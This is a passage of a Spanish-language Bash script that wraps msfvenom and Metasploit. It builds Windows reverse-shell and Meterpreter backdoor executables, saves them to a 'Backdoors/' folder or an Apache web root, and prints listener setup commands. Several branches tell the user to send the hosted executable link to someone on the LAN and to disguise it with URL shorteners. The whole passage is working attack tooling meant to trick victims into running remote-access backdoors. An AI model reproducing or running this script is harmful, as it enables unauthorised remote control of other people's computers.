				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else
				clear
				creditos
				exit
			fi	
		
		fi

	  elif [[ $optiondos == 4 || $optiondos == 04 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/x64/meterpreter/reverse_tcp"
		echo -e "\e[1;34m" 	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/meterpreter/reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
	  elif [[ $optiondos == 5 || $optiondos == 05 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "" 
		echo "Seleccionado: windows/x64/powershell_reverse_tcp"	
		echo ""
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/powershell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/powershell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/powershell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	  elif [[ $optiondos == 6 || $optiondos == 06 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo -e "" 
		echo -e "Seleccionado: \e[1;36mwindows/x64/shell_reverse_tcp"	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/x64/shell_reverse_tcp"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi

	  elif [[ $optiondos == 7 || $optiondos == 07 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/meterpreter_reverse_http"	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter_reverse_http LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35m$ruta \e[1;32mCON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"		
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
			echo ""	
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
			fi	
		
		fi
 

	  elif [[ $optiondos == 8 || $optiondos == 08 ]]; then
		echo "Has elegido el numero $optiondos"
		sleep 1.5
		clear
		payload 
		echo ""
		echo -e "Seleccionado: \e[1;36mwindows/meterpreter_reverse_https"	
		read -p $"LHOST > " lhost
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"LPORT > " lport
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Nombre sin .exe > " nombre
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Quieres subir tu .exe al servidor apache2? (Si/No) > " servidor
		echo -e "\e[0;34m---------------------\e[1;34m"
		read -p $"Escribe la ruta donde vas a guardar el .exe. Tambien si quieres que el .exe se te guarde automaticamente 
en la carpeta Backdoors/ dale ENTER. !Si aceptas subir tu .exe al servidor apache2 no se guardara en la ruta que quieres  > " ruta
		echo -e "\e[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
		if [[ $lhost == "" || $lport == "" || $nombre == "" ]]; then
			echo ""
			echo -e "\e[1;31mOpcion invalida"
			sleep 2
			clear
			banner
			banner2
			exit
		elif [[ $servidor == "Si" || $servidor == "si" || $servidor == "sI" || $servidor == "SI" ]]; then
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			service apache2 start  
			msfvenom -p windows/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f exe > /var/www/html/$nombre.exe
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN EL SERVIDOR APACHE2 CON EXITO\e[1;32m"
			echo -e "\e[0;32m"
			echo    "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_https"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			echo -e "\e[1;35mCopie esta dirreccion \e[1;33m$lhost/$nombre.exe \e[1;35mi enviasela a alguien dentro de LAN "
			echo -e "\e[1;35mtambien puedes acortar esta dirreccion con un acortador como por ejemplo: \e[1;35mhttps://bitly.com/" 
			echo -e "\e[1;33mhttps://Ad.fly.com/ https://Ouo.io.com/ https://Uii.io.com https://UrlCero.com etc..."
			echo ""	
			read -p $"Si quieres puedes eliminar el .exe del servidor apache2 i empezar desde zero (Si/No) > " eliminar
			if [[ $eliminar == "Si" || $eliminar == "SI" || $eliminar == "sI" || $eliminar == "si" ]]; then
				rm -rf /var/www/html/$nombre.exe
				sleep 0.5
				banner
				banner2
			elif [[ $eliminar == "No" || $eliminar == "no" || $eliminar == "NO" || $eliminar == "nO" ]]; then
				echo -e "\e[1;32m"
				read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
				if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
					echo ""
					echo ""
					which /etc/init.d/msfconsole > /dev/null 2>&1
					if [ "$?" -eq "0" ]; then
						echo ""
					else
						echo ""
						xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
					fi
				else 
					clear
					creditos
				exit
				fi
			fi
		elif [[ $ruta == "" ]]; then 
	 		echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f exe > $nombre.exe
			mv $nombre.exe Backdoors/
			echo ""
			echo -e "\e[1;32mPAYLOAD CREADO I GUARDADO EN: \e[1;35mBackdoors/ \e[1;32mCON EXIT"
			echo -e "\e[0;32m" 
			echo -e "COPIE I PEGUE ESTO EN METASPLOIT FRAMEWORK"
			echo ""
			echo -e "\e[0;33muse multi/handler"
			echo -e "\e[0;33mset payload windows/meterpreter_reverse_http"
			echo -e "\e[0;33mset lhost $lhost"
			echo -e "\e[0;33mset lport $lport"
			echo -e "\e[0;33mrun"
			echo -e "\e[1;32m"
			read -p $"Quieres iniciar Metasploit (Si/No)?: " meta
		
			if [[ $meta == "Si" || $meta == "si" || $meta == "sI" || $meta == "SI" ]]; then
				echo ""
				echo ""
				which /etc/init.d/msfconsole > /dev/null 2>&1
				if [ "$?" -eq "0" ]; then
					echo ""
				else
					echo ""
					xterm -T "METASPLOIT" -geometry 100x30 -e "msfconsole"
				fi
			else 
				clear
				creditos
				exit
		 	fi

		 else
			echo -e "\e[0;33m"
			echo -n [*] Creando payload...= ;
			sleep 3 & while [ "$(ps a | awk '{print $1}' | grep $!)" ] ; do for X in '-' '\' '|' '/'; do echo -en "\b$X"; sleep 0.1; done; done 
			echo ""
			echo ""
			sudo msfvenom -p windows/meterpreter_reverse_https LHOST=$lhost LPORT=$lport -f exe > $ruta/$nombre.exe 
			echo ""
